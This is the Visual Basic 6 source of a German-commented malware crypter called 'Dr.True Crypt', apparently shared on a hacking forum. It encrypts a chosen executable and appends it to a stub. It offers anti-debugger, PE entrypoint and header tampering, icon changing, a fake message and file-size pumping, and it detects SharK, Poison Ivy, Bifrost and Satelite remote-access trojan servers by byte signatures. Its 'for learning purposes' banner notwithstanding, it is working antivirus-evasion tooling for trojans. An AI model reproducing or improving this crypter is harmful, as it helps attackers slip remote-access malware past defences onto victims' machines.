VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Dr.True Crypt by The-Wall "
   ClientHeight    =   9465
   ClientLeft      =   5160
   ClientTop       =   3795
   ClientWidth     =   6330
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9465
   ScaleWidth      =   6330
   ShowInTaskbar   =   0   'False
   Begin VB.Frame Frame1 
      Caption         =   "Menu"
      Height          =   7215
      Left            =   120
      TabIndex        =   0
      Top             =   2160
      Width           =   6135
      Begin VB.Frame Frame9 
         Caption         =   "Custom Stub"
         Height          =   735
         Left            =   240
         TabIndex        =   21
         Top             =   3600
         Width           =   5655
         Begin VB.TextBox Text5 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   22
            Text            =   "Pfad..."
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frame8 
         Caption         =   "Build Menu"
         Height          =   1695
         Left            =   240
         TabIndex        =   18
         Top             =   5280
         Width           =   3015
         Begin VB.CommandButton Command5 
            Caption         =   "Browse Custom Stub"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   30
            Top             =   1320
            Width           =   2775
         End
         Begin VB.CommandButton Command3 
            Caption         =   "Browse Icon"
            Enabled         =   0   'False
            Height          =   255
            Left            =   1560
            TabIndex        =   29
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton Command2 
            Caption         =   "About"
            Height          =   255
            Left            =   1560
            TabIndex        =   28
            Top             =   600
            Width           =   1335
         End
         Begin VB.CommandButton Command1 
            Caption         =   "Exit"
            Height          =   255
            Left            =   1560
            TabIndex        =   27
            Top             =   960
            Width           =   1335
         End
         Begin VB.CommandButton cmdCrypt 
            Caption         =   "Crypt"
            Height          =   255
            Left            =   120
            TabIndex        =   26
            Top             =   960
            Width           =   1335
         End
         Begin VB.CommandButton cmdBrowse 
            Caption         =   "Browse"
            Height          =   255
            Left            =   120
            TabIndex        =   25
            Top             =   600
            Width           =   1335
         End
         Begin VB.CommandButton Command4 
            Caption         =   "Generate"
            Height          =   255
            Left            =   120
            TabIndex        =   24
            Top             =   240
            Width           =   1335
         End
      End
      Begin VB.Frame Frame7 
         Caption         =   "Fake Message"
         Height          =   735
         Left            =   240
         TabIndex        =   16
         Top             =   2760
         Width           =   5655
         Begin VB.TextBox Text4 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   17
            Text            =   "Message..."
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frame6 
         Caption         =   "File"
         Height          =   735
         Left            =   240
         TabIndex        =   14
         Top             =   240
         Width           =   5655
         Begin VB.TextBox txtFile 
            Height          =   285
            Left            =   120
            TabIndex        =   15
            Text            =   "File..."
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frame5 
         Caption         =   "Encryption String"
         Height          =   735
         Left            =   240
         TabIndex        =   12
         Top             =   1080
         Width           =   5655
         Begin VB.TextBox Text3 
            Height          =   285
            Left            =   120
            TabIndex        =   13
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frame4 
         Caption         =   "Icon Changer"
         Height          =   735
         Left            =   240
         TabIndex        =   10
         Top             =   1920
         Width           =   5655
         Begin VB.TextBox Text1 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   11
            Top             =   240
            Width           =   5415
         End
      End
      Begin VB.Frame Frame3 
         Caption         =   "Exe Pump"
         Height          =   735
         Left            =   240
         TabIndex        =   7
         Top             =   4440
         Width           =   3015
         Begin VB.TextBox Text2 
            Enabled         =   0   'False
            Height          =   285
            Left            =   120
            TabIndex        =   9
            Text            =   "0"
            Top             =   240
            Width           =   1935
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            Caption         =   "Kilo Bytes"
            Height          =   195
            Left            =   2160
            TabIndex        =   8
            Top             =   240
            Width           =   690
         End
      End
      Begin MSComDlg.CommonDialog cdl 
         Left            =   6240
         Top             =   3600
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.Frame Frame2 
         Caption         =   "Options"
         Height          =   2535
         Left            =   3480
         TabIndex        =   1
         Top             =   4440
         Width           =   2415
         Begin VB.CheckBox Check8 
            Caption         =   "Enable Custom Stub"
            Height          =   195
            Left            =   120
            TabIndex        =   23
            Top             =   720
            Width           =   1815
         End
         Begin VB.CheckBox Check7 
            Caption         =   "Enable Fake Message"
            Height          =   195
            Left            =   120
            TabIndex        =   20
            Top             =   960
            Width           =   1935
         End
         Begin VB.CheckBox Check4 
            Caption         =   "Anti Debugger"
            Height          =   195
            Left            =   120
            TabIndex        =   19
            Top             =   2280
            Width           =   1335
         End
         Begin VB.CheckBox Check1 
            Caption         =   "Change PE Entrypoint"
            ForeColor       =   &H00000000&
            Height          =   195
            Left            =   120
            TabIndex        =   6
            Top             =   1800
            Width           =   1935
         End
         Begin VB.CheckBox Check6 
            Caption         =   "Enable Icon Changer"
            Height          =   195
            Left            =   120
            TabIndex        =   5
            Top             =   480
            Width           =   1815
         End
         Begin VB.CheckBox Check5 
            Caption         =   "Enable Exe Pump"
            Height          =   195
            Left            =   120
            TabIndex        =   4
            Top             =   240
            Width           =   1575
         End
         Begin VB.CheckBox Check3 
            Caption         =   "EOF Support"
            Height          =   195
            Left            =   120
            TabIndex        =   3
            Top             =   2040
            Width           =   1215
         End
         Begin VB.CheckBox Check2 
            Caption         =   "Realign PE Header"
            ForeColor       =   &H00000000&
            Height          =   195
            Left            =   120
            TabIndex        =   2
            Top             =   1560
            Width           =   1695
         End
         Begin VB.Line Line1 
            X1              =   120
            X2              =   2280
            Y1              =   1320
            Y2              =   1320
         End
      End
      Begin MSComDlg.CommonDialog ComDlg 
         Left            =   6720
         Top             =   3600
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin MSComDlg.CommonDialog lol 
         Left            =   7560
         Top             =   600
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
   End
   Begin VB.Image Image1 
      Height          =   1950
      Left            =   120
      Picture         =   "Form1.frx":0000
      Stretch         =   -1  'True
      Top             =   120
      Width           =   6105
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Dieser Code ist für Lernzwecke|+|+|+|+|+|+|+|+|+|
'|+Keine billigen Ripps!+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Codet by The-Wall+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
'|+Contact: via PM (Free-hack)+|+|+|+|+|+|+|+|+|+|+|
'|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|+|
Const Abschluss = "{~|<(*)>|~}"
Const a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const b = "abcdefghijklmnopqrstuvwxyz"
Const c = "1234567890"
Dim Wohnort_von_der_Stub As String
Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
    Dim sFileBuf As String, sEOFBuf As String, sChar As String
    Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
    If Dir(sFilePath) = "" Then GoTo Err:
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
    sEOFBuf = (Mid$(StrReverse(sFileBuf), 1, lPos - 1))
    ReadEOFData = StrReverse(sEOFBuf)
    If ReadEOFData = "" Then
    MsgBox "Datei besitzt keine EOF Daten!", vbInformation, "Kein EOF"
    End If
    Exit Function
Err:
    ReadEOFData = vbNullString
End Function
Sub WriteEOFData(sFilePath As String, sEOFData As String)
    Dim sFileBuf As String
    Dim lFF As Long
    On Error Resume Next
    If Dir(sFilePath) = "" Then Exit Sub
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    Kill sFilePath
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        Put #lFF, , sFileBuf & sEOFData
    Close #lFF
End Sub
Function FileInfo(ByVal FFile As String)
Dim ForSize As String
Dim sstub As String
Dim hallo As String
Dim proz As Integer
Dim Finfo(0 To 100) As Double
Dim ff As Integer
ff = FreeFile
Open FFile For Binary As #ff
    ForSize = String(LOF(ff), vbNullChar)
    Get #ff, , ForSize
Close #ff
If Check8.Value = 1 Then
Wohnort_von_der_Stub = lol.FileName
Else
Wohnort_von_der_Stub = App.Path & "\stub.exe"
End If
Open Wohnort_von_der_Stub For Binary As #ff
sstub = String(LOF(ff), vbNullChar)
Get #ff, , sstub
Close #ff
Finfo(0) = InStr(ForSize, "s3|Fs|gFs[N;sÛœHsÄ¨Hs ÁGsGÂGscGsÄåFsÜŽ;sãÒGs]ðHsT&Gs½;GsibGsn‚;s`Gs™W;s;fGsž8Gs|æFsDQ;sgéFs>Þ9s<”HsÈFsSH;sñI;")
Finfo(1) = InStr(ForSize, "sharK 3")
Finfo(2) = InStr(ForSize, "½ËÚùn¥‰ùn¥‰ùn¥‰wq¶‰ýn¥‰N·‰øn¥‰Richùn¥‰")
Finfo(3) = InStr(ForSize, "ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØûûüÒöööööööÛí!")
Finfo(4) = InStr(ForSize, "233$363S34N5p5Ç5Ó5Ú5ì5þ5\6²6â6ý67")
If Finfo(0) <> 0 Then
MsgBox "Selected File is a SharK 2 Server!", vbInformation, "Info"
SharK2 = True
End If
If Finfo(1) <> 0 Then
MsgBox "Selected File is a SharK 3 Server!", vbInformation, "Info"
SharK3 = True
End If
If Finfo(2) <> 0 Then
MsgBox "Selected File is a Poisen Ivy Server!", vbInformation, "Info"
PI = True
End If
If Finfo(3) <> 0 Then
MsgBox "Selected File is a Bifrost Server!", vbInformation, "Info"
Bifrost = True
End If
If Finfo(4) <> 0 Then
MsgBox "Selected File is a Satelite 4600 Server!", vbInformation, "Info"
Bifrost = True
End If
End Function
Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function
Private Sub Check5_Click()
If Check5.Value = 1 Then
Text2.Enabled = True
Else
Text2.Enabled = False
End If
End Sub
Private Sub Check6_Click()
If Check6.Value = 1 Then
Text1.Enabled = True
Command3.Enabled = True
Else
Text1.Enabled = False
Command3.Enabled = False
End If
End Sub

Private Sub Check7_Click()
If Check7.Value = 1 Then
Text4.Enabled = True
Else
Text4.Enabled = False
End If
End Sub
Private Sub Check8_Click()
If Check8.Value = 1 Then
Text5.Enabled = True
Command5.Enabled = True
Else
Text5.Enabled = False
Command5.Enabled = False
End If
End Sub

Private Sub cmdBrowse_Click()
ComDlg.CancelError = False
ComDlg.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
ComDlg.ShowOpen
txtFile.Text = ComDlg.FileName
If txtFile.Text = "" Then
MsgBox "Please select a File!", vbInformation, "Information"
Exit Sub
Else
FileInfo (txtFile.Text)
End If
End Sub
Private Sub cmdCrypt_Click()
Dim c  As New clscrypt
Dim Data As String
Dim Stub As String
Dim pump As String
Dim kbstring As String
Dim eofdata As String
Dim i As Integer
Dim AD As String
Dim Fake As String
If ComDlg.FileName = "" Then
MsgBox "Please select a File!", vbInformation, "Info"
Exit Sub
End If
cdl.CancelError = False
cdl.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl.FileName = ""
cdl.ShowSave
If Check3.Value = 1 Then
eofdata = ReadEOFData(txtFile.Text)
Else
End If
Open txtFile.Text For Binary Access Read As #1
Data = String(LOF(1), vbNullChar)
Get #1, , Data
Close #1
If Check8.Value = 1 Then
Wohnort_von_der_Stub = lol.FileName
Else
Wohnort_von_der_Stub = App.Path & "\stub.exe"
End If
Open Wohnort_von_der_Stub For Binary Access Read As #1
Stub = String(LOF(1), vbNullChar)
Get #1, , Stub
Close #1
If Check7.Value = 1 Then
Fake = Text4.Text
End If
If Check4.Value = 1 Then
AD = "ENABLE"
End If
Open cdl.FileName For Binary Access Write As #1
Put #1, , Stub + Abschluss
Put #1, , c.EncryptString(Data, Text3.Text)
Put #1, , Abschluss
Put #1, , Fake
Put #1, , Abschluss
Put #1, , AD
Put #1, , Abschluss
Put #1, , Text3.Text
Put #1, , Abschluss
If Check5.Value = 1 Then
kbstring = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
For i = 0 To Text2.Text
pump = pump & kbstring
Next i
Put #1, LOF(1) + 1, pump
Close #1
End If
Close #1
If Check3.Value = 1 Then
Call WriteEOFData(cdl.FileName, eofdata)
End If
If Check1.Value = 1 Then
Call ChangeOEPFromFile(cdl.FileName)
End If
If Check2.Value = 1 Then
Call RealignPEFromFile(cdl.FileName)
End If
If Check6.Value = 1 Then
Call ReplaceIcons(Text1.Text, cdl.FileName, Err)
End If
MsgBox "Finish!", vbInformation, "Info"
End Sub
Private Sub Command1_Click()
End
End Sub
Private Sub Command2_Click()
MsgBox ("Codet by The-Wall (Copyright)") & vbNewLine & "Credits: Cobein for the Realign PE Header Modul!", vbInformation, "Info"
End Sub

Private Sub Command3_Click()
ComDlg.CancelError = False
ComDlg.Filter = "Icons (*.ico)|*.ico"
ComDlg.ShowOpen
Text1.Text = ComDlg.FileName
End Sub
Private Sub Command4_Click()
Text3.Text = sRandom
End Sub
Public Function sRandom()
Dim zeichen As String
Dim i As Integer

zeichen = a + b + c

For i = 1 To 50
    sRandom = sRandom & Mid$(zeichen, Int((Rnd * Len(zeichen)) + 1), 1)
Next i
End Function
Private Sub Command5_Click()
With lol
.CancelError = False
.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
.DialogTitle = "Select File"
.FileName = ""
.ShowOpen
End With
Text5.Text = lol.FileName
End Sub
Private Sub Form_Load()
Command4.Value = True
End Sub
